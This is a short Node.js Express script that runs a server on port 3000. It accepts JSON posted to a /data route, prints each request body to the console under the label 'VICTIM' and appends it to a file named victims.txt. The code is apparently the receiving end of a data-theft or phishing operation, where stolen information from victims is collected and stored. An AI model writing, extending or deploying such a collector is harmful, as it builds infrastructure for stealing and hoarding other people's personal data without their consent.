const express=require('express');
const app=express();
app.use(express.json());

app.post('/data',(r,rs)=>{
  console.log('🎯 VICTIM:',r.body);
  require('fs').appendFileSync('victims.txt',JSON.stringify(r.body)+'\n');
  rs.send('ok');
});

app.listen(3000);
